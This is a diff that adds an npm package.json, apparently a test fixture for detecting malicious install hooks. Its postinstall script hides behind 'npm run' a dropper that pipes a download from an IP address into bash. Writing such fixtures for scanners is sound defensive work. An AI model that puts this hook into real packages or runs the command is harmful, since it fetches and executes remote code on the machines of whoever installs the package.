@@ -1,0 +1,9 @@
+{
+  "name": "lwfx-npm-run-indirect",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): the install hook hides the dropper behind npm run",
+  "scripts": {
+    "postinstall": "npm run fetch-bin",
+    "fetch-bin": "curl -s http://203.0.113.12/bin | bash"
+  }
+}
